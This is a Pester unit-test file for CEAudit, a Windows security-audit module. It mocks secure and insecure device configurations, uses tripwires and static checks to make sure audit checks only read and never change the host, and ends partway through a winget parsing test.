#Requires -Modules Pester
<#
    Unit tests. Windows-only cmdlets are stubbed and mocked, so these run on
    Windows PowerShell 5.1, PowerShell 7 on Windows, and PowerShell 7 on Linux (CI).

    Run:  Invoke-Pester -Path .\tests -Output Detailed
#>

BeforeAll {
    # The suite mocks every Windows write it knows about, but a forgotten mock must not be able to
    # change this machine. Refuse to run elevated outside CI (set CE_TESTS_ALLOW_ELEVATED=1 to override).
    if ($env:OS -eq 'Windows_NT' -and -not $env:CI -and -not $env:CE_TESTS_ALLOW_ELEVATED) {
        $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            throw 'Refusing to run the test suite elevated: run it as a standard user, or set CE_TESTS_ALLOW_ELEVATED=1 in a disposable VM or Windows Sandbox.'
        }
    }

    $script:RepoRoot = Split-Path -Parent $PSScriptRoot
    $modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'

    # Stubs for Windows-only commands so Pester can mock them on any OS. They
    # declare the parameters the module uses so mocks can read them.
    $stubs = @(
        'Get-NetFirewallProfile', 'Get-NetFirewallRule', 'Get-NetFirewallAddressFilter', 'Set-NetFirewallProfile', 'Disable-NetFirewallRule',
        'Get-LocalUser', 'Get-LocalGroupMember', 'Disable-LocalUser', 'Enable-LocalUser',
        'Get-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Get-CimInstance',
        'Get-Service', 'Set-Service', 'Stop-Service', 'Get-WinEvent',
        'Get-MpComputerStatus', 'Get-MpPreference', 'Set-MpPreference', 'Add-MpPreference', 'Remove-MpPreference', 'Update-MpSignature',
        'Get-AppLockerPolicy', 'Get-BitLockerVolume', 'Confirm-SecureBootUEFI', 'Get-SecureBootUEFI', 'Start-ScheduledTask', 'Get-WindowsFeature', 'Get-MpThreat', 'Get-MpThreatDetection', 'Get-VM', 'Get-VMSwitch', 'Get-VMNetworkAdapter', 'Get-NetNatStaticMapping', 'Get-NetTCPConnection'
    )
    $stubBody = {
        [CmdletBinding()]
        param(
            [Parameter(Position = 0)]$Name, $ClassName, $Namespace, $FeatureName, $PolicyStore, $MountPoint,
            $Direction, $Enabled, $Action, $SID, $ListLog, $TaskPath, $TaskName, $VMName, $State, [switch]$Online, [switch]$Effective, [switch]$Xml,
            [Parameter(ValueFromPipeline)]$InputObject,
            [Parameter(ValueFromRemainingArguments)]$Rest
        )
        process { }
    }
    foreach ($s in $stubs) {
        if (-not (Get-Command $s -ErrorAction SilentlyContinue)) {
            Set-Item -Path "function:global:$s" -Value $stubBody
        }
    }

    Import-Module $modulePath -Force

    # Tripwires: every command that can change the device throws unless a test mocks it deliberately.
    # A narrower mock (in a Describe, It or InModuleScope) takes precedence, so existing tests keep working;
    # a test that forgets to mock a write fails loudly instead of touching the host.
    $script:MutatingCommands = @(
        'Set-ItemProperty', 'New-ItemProperty', 'Remove-ItemProperty', 'Set-Service', 'Stop-Service', 'Restart-Service',
        'Set-NetFirewallProfile', 'Set-NetFirewallRule', 'Enable-NetFirewallRule', 'Disable-NetFirewallRule',
        'Enable-LocalUser', 'Disable-LocalUser', 'Add-MpPreference', 'Remove-MpPreference', 'Set-MpPreference', 'Update-MpSignature',
        'Enable-WindowsOptionalFeature', 'Disable-WindowsOptionalFeature', 'Suspend-BitLocker', 'Start-ScheduledTask',
        'Start-Process', 'Invoke-Expression', 'New-EventLog', 'Write-EventLog',
        'Set-CESecurityPolicyValue', 'Invoke-CENative'
    )
    function global:Set-TestTripwires {
        # Re-run after any Import-Module -Force: a fresh module instance has no mocks.
        foreach ($cmd in $script:MutatingCommands) {
            # Resolve inside the module so private helpers (Invoke-CENative, Set-CESecurityPolicyValue) are covered too.
            $known = & (Get-Module CEAudit) { param($n) [bool](Get-Command $n -ErrorAction SilentlyContinue) } $cmd
            if ($known) { Mock -ModuleName CEAudit $cmd { throw "Tripwire: a test reached $cmd without mocking it" }.GetNewClosure() }
        }
        # New-Item creates report folders legitimately; only registry keys are off limits. One default mock
        # that decides in the body: Pester 6 has no fallback when a -ParameterFilter does not match.
        Mock -ModuleName CEAudit New-Item {
            if ("$Path$LiteralPath" -match '^(HK(LM|CU|CR|U|CC):|Registry::)') { throw 'Tripwire: a test reached New-Item on a registry path without mocking it' }
            Microsoft.PowerShell.Management\New-Item @PesterBoundParameters
        }
    }
    Set-TestTripwires

    function global:New-TestHardware {
        <# A recent laptop with patched TPM firmware; -Insecure gives old BIOS and ROCA-affected TPM firmware. #>
        param([switch]$Insecure)
        $biosDate = if ($Insecure) { (Get-Date).AddDays(-1900) } else { (Get-Date).AddDays(-60) }
        [pscustomobject]@{
            Manufacturer = 'Contoso'; Model = 'Laptop 14 G5'; SystemSku = 'CT14G5'; SerialNumber = 'SN-TEST-001'; Baseboard = 'Contoso 8A3B'; BaseboardProduct = '8A3B'
            IsVirtualMachine = $false
            Firmware = [pscustomobject]@{ Vendor = 'Contoso'; Version = $(if ($Insecure) { '1.02.0' } else { '1.20.0' }); ReleaseDate = $biosDate.ToString('yyyy-MM-dd'); Type = 'UEFI' }
            Tpm = [pscustomobject]@{ Readable = $true; Present = $true; Manufacturer = 'IFX'; FirmwareVersion = $(if ($Insecure) { '7.40.2098.0' } else { '7.63.3353.0' }); SpecVersion = '2.0' }
            Cpu = @([pscustomobject]@{ Name = 'Contoso CPU 7'; Manufacturer = 'GenuineIntel'; Cores = 8; LogicalProcessors = 8; MicrocodeRevision = '0x11A' })
            Disks = @([pscustomobject]@{ Model = 'Contoso NVMe 1TB'; FirmwareRevision = '4B2QJXD7'; InterfaceType = 'SCSI'; SizeGB = 954; SerialNumber = 'DSK-001' })
            Errors = @()
        }
    }

    function global:New-TestContext {
        param([hashtable]$Override = @{})
        $ctx = [ordered]@{
            ComputerName = 'TESTPC'; OSFamily = 'Windows 11'; ProductName = 'Windows 10 Pro'; EditionID = 'Professional'
            EditionClass = 'Pro'; DisplayVersion = '25H2'; Build = 26200; UBR = 6584; FullBuild = '26200.6584'
            DomainJoined = $false; EntraJoined = $false; MdmEnrolled = $false; HelloProvisioned = $false
            RunningAs = 'TESTPC\admin'; ConsoleUser = 'TESTPC\paul'; IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null; PSVersion = '7.4'
            AuditTime = (Get-Date); CentrallyManaged = $false
            Hardware = (New-TestHardware)
        }
        foreach ($k in $Override.Keys) { $ctx[$k] = $Override[$k] }
        return [pscustomobject]$ctx
    }

    function global:Set-TestDevice {
        <# Installs mocks describing either an 'insecure' or a 'secure' device. #>
        param([ValidateSet('Insecure', 'Secure')][string]$Kind, [hashtable]$ContextOverride = @{})

        $secure = ($Kind -eq 'Secure')
        $global:CETestCtx = New-TestContext $ContextOverride
        if (-not $secure -and -not $ContextOverride.ContainsKey('Hardware')) { $global:CETestCtx.Hardware = New-TestHardware -Insecure }
        $global:CETestReg = @{}
        $reg = $global:CETestReg
        if ($secure) {
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoDriveTypeAutoRun'] = 255
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer|NoAutorun'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer|NoAutoplayfornonVolume'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|InactivityTimeoutSecs'] = 600
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork\PINComplexity|MinimumPINLength'] = 6
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|EnableSmartScreen'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\System|ShellSmartScreenLevel'] = 'Block'
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|SmartScreenPuaEnabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Edge|PreventSmartScreenPromptOverrideForFiles'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RunAsPPL'] = 2
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RestrictAnonymous'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient|EnableMulticast'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters|RequireSecuritySignature'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit|ProcessCreationIncludeCmdLine_Enabled'] = 1
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging|EnableScriptBlockLogging'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy|VerifiedAndReputablePolicyState'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status'] = 'Updated'
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable'] = 2
        }
        else {
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server|fDenyTSConnections'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp|UserAuthentication'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU|NoAutoUpdate'] = 1
            $reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|EnableLUA'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Chrome|SafeBrowsingProtectionLevel'] = 0
            $reg['HKLM:\SOFTWARE\Policies\Google\Update|UpdateDefault'] = 0
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest|UseLogonCredential'] = 1
            $reg['HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance|fAllowToGetHelp'] = 1
        }

        Mock -ModuleName CEAudit Get-CEDeviceContext { $global:CETestCtx }
        Mock -ModuleName CEAudit Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Disabled'; Record = $null; FromCache = $false; Message = 'test'; Key = $null } }
        Mock -ModuleName CEAudit Get-CERegistryValue {
            $k = "$Path|$Name"
            if ($global:CETestReg.ContainsKey($k)) { return $global:CETestReg[$k] }
            return $Default
        }
        Mock -ModuleName CEAudit Test-CEPendingReboot { -not $global:CETestSecure }
        $global:CETestSecure = $secure

        $fwEnabled = if ($secure) { 'True' } else { 'False' }
        $fwInbound = if ($secure) { 'Block' } else { 'Allow' }
        $global:CETestFw = @('Domain', 'Private', 'Public') | ForEach-Object {
            [pscustomobject]@{ Name = $_; Enabled = $fwEnabled; DefaultInboundAction = $fwInbound; AllowInboundRules = $(if ($secure) { 'False' } else { 'True' }); LogBlocked = 'True'; LogMaxSizeKilobytes = 16384 }
        }
        Mock -ModuleName CEAudit Get-NetFirewallProfile {
            if ($Name) { return $global:CETestFw | Where-Object Name -eq $Name }
            return $global:CETestFw
        }
        Mock -ModuleName CEAudit Get-NetFirewallRule {
            if ($global:CETestSecure) { return @() }
            [pscustomobject]@{ Name = '{1234-ABCD}'; DisplayName = 'Old game server'; DisplayGroup = $null; Profile = 'Any' }
        }
        Mock -ModuleName CEAudit Get-NetFirewallAddressFilter { [pscustomobject]@{ RemoteAddress = 'Any' } }

        Mock -ModuleName CEAudit Get-CimInstance {
            switch ($ClassName) {
                'FirewallProduct' { @() }
                'AntiVirusProduct' {
                    [pscustomobject]@{ displayName = 'Microsoft Defender Antivirus'; productState = $(if ($global:CETestSecure) { 0x61100 } else { 0x61110 }) }
                }
                'Win32_DeviceGuard' {
                    [pscustomobject]@{ VirtualizationBasedSecurityStatus = 2; SecurityServicesRunning = $(if ($global:CETestSecure) { @(2) } else { @(0) }); UsermodeCodeIntegrityPolicyEnforcementStatus = 0 }
                }
                'Win32_Tpm' { [pscustomobject]@{ SpecVersion = '2.0, 0, 1.59' } }
                'Win32_SystemDriver' { $global:CETestDrivers }
                default { $null }
            }
        }

        $users = @(
            [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-2-3-500'; Enabled = (-not $secure); PasswordRequired = $true; LastLogon = $null },
            [pscustomobject]@{ Name = 'Guest'; SID = 'S-1-5-21-1-2-3-501'; Enabled = (-not $secure); PasswordRequired = $false; LastLogon = $null },
            [pscustomobject]@{ Name = 'paul'; SID = 'S-1-5-21-1-2-3-1001'; Enabled = $true; PasswordRequired = $true; LastLogon = (Get-Date).AddDays(-1) }
        )
        if (-not $secure) {
            $users += [pscustomobject]@{ Name = 'olduser'; SID = 'S-1-5-21-1-2-3-1002'; Enabled = $true; PasswordRequired = $false; LastLogon = (Get-Date).AddDays(-400) }
        }
        $global:CETestUsers = $users
        Mock -ModuleName CEAudit Get-LocalUser { $global:CETestUsers }
        Mock -ModuleName CEAudit Get-LocalGroupMember {
            $m = @([pscustomobject]@{ Name = 'TESTPC\admin'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1003' })
            if (-not $global:CETestSecure) {
                $m += [pscustomobject]@{ Name = 'TESTPC\paul'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1001' }
                $m += [pscustomobject]@{ Name = 'TESTPC\olduser'; ObjectClass = 'User'; PrincipalSource = 'Local'; SID = 'S-1-5-21-1-2-3-1002' }
            }
            $m
        }
        Mock -ModuleName CEAudit Get-WindowsOptionalFeature {
            $state = if ($global:CETestSecure) { 'Disabled' } else { 'Enabled' }
            [pscustomobject]@{ FeatureName = $FeatureName; State = $state }
        }
        # Anti-malware: services, loaded drivers and minifilters (fltmc) seen by MP-01.
        $global:CETestServiceList = @([pscustomobject]@{ Name = 'WinDefend'; Status = 'Running'; StartType = 'Automatic' })
        $global:CETestDrivers = @()
        $global:CETestFltmc = @(
            '', 'Filter Name                     Num Instances    Altitude    Frame',
            '------------------------------  -------------  ------------  -----',
            'bindflt                                 1       409800         0',
            'WdFilter                                6       328010         0',
            'storqosflt                              0       244000         0',
            'FileInfo                                6        40500         0')
        Mock -ModuleName CEAudit Get-Service {
            if (-not $Name) { return $global:CETestServiceList }
            $start = if ($global:CETestSecure) { 'Disabled' } else { 'Automatic' }
            if ($Name -eq 'wuauserv') { $start = 'Manual' }
            [pscustomobject]@{ Name = $Name; StartType = $start; Status = 'Running' }
        }

        Mock -ModuleName CEAudit Invoke-CENative {
            $out = switch -Regex ($FilePath) {
                'net\.exe' {
                    if ($global:CETestSecure) {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          Unlimited', 'Minimum password length:                              12',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    10',
                          'Lockout duration (minutes):                           10', 'Lockout observation window (minutes):                 10',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                    else {
                        @('Force user logoff how long after time expires?:       Never', 'Minimum password age (days):                          0',
                          'Maximum password age (days):                          42', 'Minimum password length:                              0',
                          'Length of password history maintained:                None', 'Lockout threshold:                                    Never',
                          'Lockout duration (minutes):                           30', 'Lockout observation window (minutes):                 30',
                          'Computer role:                                        WORKSTATION', 'The command completed successfully.')
                    }
                }
                'whoami' {
                    '"BUILTIN\Users","Alias","S-1-5-32-545","Mandatory group, Enabled by default, Enabled group"'
                    if (-not $global:CETestSecure) { '"BUILTIN\Administrators","Alias","S-1-5-32-544","Group used for deny only"' }
                }
                'fltmc' { $global:CETestFltmc }
                default { @() }
            }
            [pscustomobject]@{ ExitCode = 0; Output = @($out) }
        }
        Mock -ModuleName CEAudit Get-CESecurityPolicy { @{ PasswordComplexity = $(if ($global:CETestSecure) { '0' } else { '1' }) } }
        Mock -ModuleName CEAudit Get-CEAuditPolicy {
            $setting = if ($global:CETestSecure) { 'Success and Failure' } else { 'No Auditing' }
            $map = @{}
            foreach ($g in @('0cce922b', '0cce9215', '0cce923f', '0cce9235', '0cce9237', '0cce9217', '0cce922f')) {
                $map["$g-69ae-11d9-bed3-505054503030"] = [pscustomobject]@{ Name = $g; Setting = $setting }
            }
            $map
        }
        Mock -ModuleName CEAudit Get-CEWindowsUpdateState {
            $pending = @()
            if (-not $global:CETestSecure) {
                $pending += [pscustomobject]@{ Title = '2026-08 Cumulative Update'; KB = 'KB5099999'; Severity = 'Critical'; Released = (Get-Date).AddDays(-30); IsSecurity = $true; Categories = 'Security Updates' }
            }
            [pscustomobject]@{ Pending = $pending; History = @([pscustomobject]@{ Title = 'x'; Date = (Get-Date).AddDays(-3); ResultCode = 2 }) }
        }
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            $pkgs = @()
            if (-not $global:CETestSecure) { $pkgs = @([pscustomobject]@{ Name = '7-Zip'; Id = '7zip.7zip'; Version = '23.01'; Available = '25.01'; Source = 'winget' }) }
            [pscustomobject]@{ Available = $true; Packages = $pkgs }
        }
        # The machine-wide VS Code folder is real on CI runners; keep built-in extension scanning out of device mocks.
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @() }
        Mock -ModuleName CEAudit Get-CEInstalledSoftware {
            $s = @([pscustomobject]@{ Name = 'Microsoft OneDrive'; Version = '25.1'; Publisher = 'Microsoft'; InstallDate = '' })
            if (-not $global:CETestSecure) {
                $s += [pscustomobject]@{ Name = 'Python 3.8.10 (64-bit)'; Version = '3.8.10'; Publisher = 'PSF'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'AnyDesk'; Version = '9'; Publisher = 'AnyDesk'; InstallDate = '' }
                $s += [pscustomobject]@{ Name = 'Google Chrome'; Version = '140'; Publisher = 'Google'; InstallDate = '' }
            }
            $s
        }
        Mock -ModuleName CEAudit Get-MpComputerStatus {
            $on = $global:CETestSecure
            [pscustomobject]@{
                AMRunningMode = 'Normal'; AntivirusEnabled = $true; RealTimeProtectionEnabled = $on; BehaviorMonitorEnabled = $true
                IoavProtectionEnabled = $true; OnAccessProtectionEnabled = $true; IsTamperProtected = $on
                AntivirusSignatureLastUpdated = $(if ($on) { (Get-Date).AddHours(-2) } else { (Get-Date).AddDays(-9) })
                AntivirusSignatureVersion = '1.1'; AMEngineVersion = '1.1'; AMProductVersion = '4.18'
            }
        }
        # No virtual machines, WSL or containers unless a test sets them up (keeps this machine's real WSL out of the results).
        Mock -ModuleName CEAudit Get-CEVirtualisationState {
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() }
                VMware = @(); VirtualBox = @(); Wsl = @(); WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @() }
        }
        # No AI tools unless a test sets them up (keeps this machine's real apps out of the results).
        Mock -ModuleName CEAudit Get-CEAIToolState { [pscustomobject]@{ Tools = @(); UninspectedProcesses = @() } }
        Mock -ModuleName CEAudit Get-CEMcpInventory { [ordered]@{ mcpConfigsFound = 0; mcpConfigsParsed = 0; mcpConfigsUnreadable = @(); mcpServers = @(); credentialsFound = 0; credentialsPlaintext = 0; scanBounds = 'test' } }
        Mock -ModuleName CEAudit Get-MpThreat { @() }
        Mock -ModuleName CEAudit Get-MpThreatDetection { @() }
        Mock -ModuleName CEAudit Get-MpPreference {
            if ($global:CETestSecure) {
                $ids = @((Get-CEConfig).'asr-rules'.rules | ForEach-Object { $_.id })
                [pscustomobject]@{ MAPSReporting = 2; SubmitSamplesConsent = 1; PUAProtection = 1; EnableNetworkProtection = 1
                    AttackSurfaceReductionRules_Ids = $ids; AttackSurfaceReductionRules_Actions = @($ids | ForEach-Object { 1 })
                    ExclusionPath = @(); ExclusionExtension = @(); ExclusionProcess = @() }
            }
            else {
                [pscustomobject]@{ MAPSReporting = 0; SubmitSamplesConsent = 2; PUAProtection = 0; EnableNetworkProtection = 0
                    AttackSurfaceReductionRules_Ids = @(); AttackSurfaceReductionRules_Actions = @()
                    ExclusionPath = @('C:\', 'C:\Tools\build'); ExclusionExtension = @('exe'); ExclusionProcess = @() }
            }
        }
        Mock -ModuleName CEAudit Get-BitLockerVolume {
            if ($global:CETestSecure) {
                [pscustomobject]@{ VolumeStatus = 'FullyEncrypted'; ProtectionStatus = 'On'; EncryptionMethod = 'XtsAes256'
                    KeyProtector = @([pscustomobject]@{ KeyProtectorType = 'TpmPin' }, [pscustomobject]@{ KeyProtectorType = 'RecoveryPassword' }) }
            }
            else {
                [pscustomobject]@{ VolumeStatus = 'FullyDecrypted'; ProtectionStatus = 'Off'; EncryptionMethod = 'None'; KeyProtector = @() }
            }
        }
        Mock -ModuleName CEAudit Confirm-SecureBootUEFI { $global:CETestSecure }
        $global:CETestSbVars = if ($secure) {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011 Windows UEFI CA 2023 Microsoft UEFI CA 2023 Microsoft Option ROM UEFI CA 2023'
               KEK = 'Microsoft Corporation KEK CA 2011 Microsoft Corporation KEK 2K CA 2023' }
        }
        else {
            @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011'; KEK = 'Microsoft Corporation KEK CA 2011' }
        }
        $global:CETestSbEvents = @()
        Mock -ModuleName CEAudit Get-CESecureBootVariableText { $global:CETestSbVars[$Name] }
        Mock -ModuleName CEAudit Get-CESecureBootEvent { $global:CETestSbEvents }
        Mock -ModuleName CEAudit Get-AppLockerPolicy { throw 'not available' }
        Mock -ModuleName CEAudit Get-WinEvent { [pscustomobject]@{ MaximumSizeInBytes = $(if ($global:CETestSecure) { 2GB } else { 20MB }) } }
    }
}

Describe 'Module structure' {
    It 'loads 57 checks with unique ids' {
        $checks = Get-CECheck
        $checks.Count | Should -Be 57
        ($checks.Id | Sort-Object -Unique).Count | Should -Be $checks.Count
    }

    It 'every check maps to at least one framework and a reference' {
        foreach ($c in Get-CECheck) {
            $c.Frameworks.Count | Should -BeGreaterThan 0 -Because $c.Id
            $c.Reference | Should -Not -BeNullOrEmpty -Because $c.Id
        }
    }

    It 'every remediation referenced by a check exists in the library' {
        $files = Get-ChildItem -Path (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Checks') -Filter *.ps1
        $refs = $files | Select-String -Pattern "New-CERemediationRef -Id '([A-Za-z0-9-]+)'" -AllMatches |
            ForEach-Object { $_.Matches } | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
        $lib = (Get-CERemediation).Id
        foreach ($r in $refs) { $lib | Should -Contain $r }
    }

    It 'high-risk remediations are never selected by default' {
        Get-CERemediation | Where-Object Risk -eq 'High' | ForEach-Object { $_.SelectedByDefault | Should -BeFalse -Because $_.Id }
    }

    It 'the CE v3.3 auto-fail areas are flagged' {
        (Get-CECheck -Id 'SU-03').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'SU-05').AutoFail | Should -BeTrue
        (Get-CECheck -Id 'UA-07').AutoFail | Should -BeTrue
    }

    It 'source files are ASCII only (Windows PowerShell 5.1 safe)' {
        $files = Get-ChildItem -Path $script:RepoRoot -Recurse -Include *.ps1, *.psm1, *.psd1 | Where-Object { $_.FullName -notmatch '[\\/]output[\\/]' }
        foreach ($f in $files) {
            $bytes = [IO.File]::ReadAllBytes($f.FullName)
            @($bytes | Where-Object { $_ -gt 127 }).Count | Should -Be 0 -Because $f.Name
        }
    }
}

Describe 'Static invariants' {
    BeforeAll {
        $script:srcDir = Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit'
        function global:Get-CommandNames {
            # Names of commands invoked in a file (CommandAst only, so names inside strings do not count).
            param([string]$Path)
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$null, [ref]$null)
            @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) |
                ForEach-Object { $_.GetCommandName() } | Where-Object { $_ } | Sort-Object -Unique)
        }
    }

    It 'tripwires fire when module code reaches a mutating command without a mock' {
        # Exercised the way real code hits them: a module function writing the registry, and a native call.
        InModuleScope CEAudit {
            $caught = ''
            try { Set-CERegistryValueTracked -Path 'HKCU:\Software\CETestNoWrite' -Name 'x' -Value 1 -Undo ([System.Collections.ArrayList]@()) } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*New-Item'
            $caught = ''
            try { Invoke-CENative -FilePath 'net.exe' -ArgumentList @('accounts') } catch { $caught = $_.Exception.Message }
            $caught | Should -Match 'Tripwire.*Invoke-CENative'
        }
        Test-Path 'HKCU:\Software\CETestNoWrite' | Should -BeFalse
    }

    It 'checks only read: no check file invokes a command that changes the device' {
        # "Read first. Change nothing." - enforced on the AST, not by review.
        $deny = @($script:MutatingCommands | Where-Object { $_ -ne 'Invoke-CENative' }) + @(
            'Remove-Item', 'New-Item', 'Set-Content', 'Add-Content', 'Out-File', 'Copy-Item', 'Move-Item', 'Rename-Item',
            'Register-ScheduledTask', 'Unregister-ScheduledTask', 'Set-ScheduledTask', 'Set-CERegistryValueTracked', 'Add-CEUndoCommand',
            'net', 'net.exe', 'auditpol', 'auditpol.exe', 'wevtutil', 'wevtutil.exe', 'secedit', 'secedit.exe', 'reg', 'reg.exe', 'sc', 'sc.exe')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($deny -contains $name) { "$($file.Name) calls $name" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'checks run native tools only to read' {
        # Invoke-CENative is the one way a check reaches outside PowerShell; every use must be a known query.
        $allowed = @('whoami.exe /groups', 'fltmc.exe filters', 'winget upgrade')
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:srcDir 'Checks') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $calls = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].GetCommandName() -eq 'Invoke-CENative' }, $true)
            foreach ($call in $calls) {
                $text = $call.Extent.Text -replace '\s+', ' '
                $exe = [regex]::Match($text, '-FilePath (?:''([^'']+)''|\$(\w+))').Groups
                $first = [regex]::Match($text, '-ArgumentList @\(''([^'']+)''').Groups[1].Value
                $key = "$(if ($exe[1].Value) { $exe[1].Value } else { $exe[2].Value }) $first"
                if ($allowed -notcontains $key) { "$($file.Name): $key" }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }

    It 'front-end scripts only call functions the module exports' {
        # The app runs outside the module: a private function resolves at authoring time (and in this
        # suite, which dot-sources the app) but not at runtime. Everything it calls must be its own,
        # exported from CEAudit.psd1, or a real command.
        $manifest = Import-PowerShellDataFile (Join-Path $script:srcDir 'CEAudit.psd1')
        $exported = @($manifest.FunctionsToExport)
        $modulePrivate = @(Get-ChildItem (Join-Path $script:srcDir 'Private') -Filter *.ps1 | ForEach-Object {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($_.FullName, [ref]$null, [ref]$null)
            $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name
        })
        $problems = foreach ($file in Get-ChildItem (Join-Path $script:RepoRoot 'app') -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $own = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) | ForEach-Object Name)
            foreach ($name in (Get-CommandNames $file.FullName)) {
                if ($own -contains $name -or $exported -contains $name) { continue }
                if ($modulePrivate -contains $name) { "$($file.Name) calls private module function $name"; continue }
            }
        }
        @($problems) -join "`n" | Should -BeNullOrEmpty
    }
}

Describe 'Parsers' {
    It 'parses net accounts output' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @(
                    'Force user logoff how long after time expires?:       Never',
                    'Minimum password age (days):                          0',
                    'Maximum password age (days):                          Unlimited',
                    'Minimum password length:                              12',
                    'Length of password history maintained:                None',
                    'Lockout threshold:                                    10',
                    'Lockout duration (minutes):                           10',
                    'Lockout observation window (minutes):                 10',
                    'Computer role:                                        WORKSTATION',
                    'The command completed successfully.') }
            }
            $p = Get-CEAccountPolicy
            $p.MinPasswordLength | Should -Be 12
            $p.MaxPasswordAgeDays | Should -Be -1
            $p.LockoutThreshold | Should -Be 10
            $p.LockoutWindowMinutes | Should -Be 10
        }
    }

    It 'treats a "Never" lockout threshold as 0' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                [pscustomobject]@{ ExitCode = 0; Output = @('a: Never', 'b: 0', 'c: 42', 'd: 0', 'e: None', 'f: Never', 'g: 30', 'h: 30', 'i: WORKSTATION') }
            }
            (Get-CEAccountPolicy).LockoutThreshold | Should -Be 0
        }
    }

    It 'parses winget upgrade tables' {
        InModuleScope CEAudit {
            $cr = [char]13
            $ell = [char]0x2026
            $lines = @(
                ("   - $cr   \ $cr   | $cr" + (' ' * 80) + "${cr}Name                               Id                          Version        Available      Source"),
                ('-' * 119),
                '7-Zip 23.01 (x64)                  7zip.7zip                   23.01          25.01          winget',
                'Microsoft Visual Studio Code (User) Microsoft.VisualStudioCode 1.100.0        1.104.0        winget',
                "Some Very Long Application Name    Contoso.SomeVeryLongApp$ell    1.0            2.0            winget",
                '3 upgrades available.',
                '',
                'The following packages have an upgrade available, but require explicit targeting for upgrade:',
                'Name                                         Id                                    Version   Available Source',
                ('-' * 109),
                'Discord                                      Discord.Discord                       1.0.9163  1.0.9200  winget',
                "1 package(s) have pins that prevent upgrade. Use the 'winget pin' command to view and edit pins."
            )
